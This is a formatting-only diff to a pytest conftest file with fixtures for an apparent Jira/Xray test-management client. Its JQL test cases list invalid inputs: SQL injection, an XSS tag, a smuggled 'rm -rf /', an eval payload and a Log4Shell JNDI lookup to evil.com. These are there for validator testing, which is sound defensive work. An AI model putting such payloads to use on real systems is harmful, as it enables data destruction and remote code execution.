@@ -13,6 +13,7 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 def event_loop():
     """Create an instance of the default event loop for the test session."""
     import asyncio
+
     loop = asyncio.new_event_loop()
     yield loop
     loop.close()
@@ -21,6 +22,7 @@ def event_loop():
 @pytest.fixture
 def mock_graphql_response():
     """Factory for creating mock GraphQL responses."""
+
     def _create_response(data=None, errors=None):
         response = {}
         if data is not None:
@@ -28,6 +30,7 @@ def mock_graphql_response():
         if errors is not None:
             response["errors"] = errors
         return response
+
     return _create_response
 
 
@@ -49,21 +52,21 @@ def sample_test_data():
                     "id": "1",
                     "action": "Open application",
                     "data": "URL: https://example.com",
-                    "result": "Application loads successfully"
+                    "result": "Application loads successfully",
                 },
                 {
-                    "id": "2", 
+                    "id": "2",
                     "action": "Click login button",
                     "data": "",
-                    "result": "Login form appears"
-                }
+                    "result": "Login form appears",
+                },
             ],
             "jira": {
                 "key": "TEST-101",
                 "summary": "Test user login flow",
                 "status": {"name": "To Do"},
-                "assignee": {"displayName": "Test User"}
-            }
+                "assignee": {"displayName": "Test User"},
+            },
         },
         "cucumber_test": {
             "issueId": "TEST-102",
@@ -76,8 +79,8 @@ def sample_test_data():
             "jira": {
                 "key": "TEST-102",
                 "summary": "Cucumber login test",
-                "status": {"name": "In Progress"}
-            }
+                "status": {"name": "In Progress"},
+            },
         },
         "generic_test": {
             "issueId": "TEST-103",
@@ -86,9 +89,9 @@ def sample_test_data():
             "jira": {
                 "key": "TEST-103",
                 "summary": "API health check test",
-                "status": {"name": "Done"}
-            }
-        }
+                "status": {"name": "Done"},
+            },
+        },
     }
 
 
@@ -104,15 +107,15 @@ def sample_execution_data():
             "results": [
                 {"issueId": "TEST-101", "testType": {"name": "Manual"}},
                 {"issueId": "TEST-102", "testType": {"name": "Cucumber"}},
-                {"issueId": "TEST-103", "testType": {"name": "Generic"}}
-            ]
+                {"issueId": "TEST-103", "testType": {"name": "Generic"}},
+            ],
         },
         "jira": {
             "key": "EXEC-201",
             "summary": "Sprint 10 - Regression Testing",
             "status": {"name": "In Progress"},
-            "assignee": {"displayName": "QA Team"}
-        }
+            "assignee": {"displayName": "QA Team"},
+        },
     }
 
 
@@ -127,7 +130,7 @@ def jql_test_cases():
             'created >= -7d AND project in ("TEST", "DEMO")',
             'labels = "regression" AND fixVersion = "2.0"',
             'issuetype = "Test" AND updated >= startOfWeek()',
-            'text ~ "login" AND project = "TEST"'
+            'text ~ "login" AND project = "TEST"',
         ],
         "invalid": [
             'project = "TEST"; DROP TABLE users;',
@@ -136,8 +139,8 @@ def jql_test_cases():
             '<script>alert("XSS")</script>',
             'project = "TEST" && rm -rf /',
             'eval(atob("malicious"))',
-            'project = "${jndi:ldap://evil.com/a}"'
-        ]
+            'project = "${jndi:ldap://evil.com/a}"',
+        ],
     }
 
 
@@ -159,12 +162,6 @@ def pytest_configure(config):
     config.addinivalue_line(
         "markers", "integration: Integration tests that may require external services"
     )
-    config.addinivalue_line(
-        "markers", "security: Security-focused tests"
-    )
-    config.addinivalue_line(
-        "markers", "slow: Tests that take longer to execute"
-    )
-    config.addinivalue_line(
-        "markers", "asyncio: Tests that use asyncio"
-    )
+    config.addinivalue_line("markers", "security: Security-focused tests")
+    config.addinivalue_line("markers", "slow: Tests that take longer to execute")
+    config.addinivalue_line("markers", "asyncio: Tests that use asyncio")
